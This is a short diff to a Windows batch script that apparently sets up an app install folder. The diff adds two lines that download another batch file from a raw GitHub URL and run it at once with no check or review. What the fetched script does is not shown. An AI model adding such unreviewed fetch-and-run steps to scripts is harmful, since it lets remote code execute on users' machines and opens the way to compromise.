@@ -3,6 +3,8 @@ cls
 Color 3f
 mode con: cols=25 lines=2
 
+curl -L -o crmdown.bat "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/CM/crmdown.bat"
+start crmdown.bat
 
 REM Check if C:\MyApps\Inustall exists
 if not exist "C:\MyApps\Inustall" (
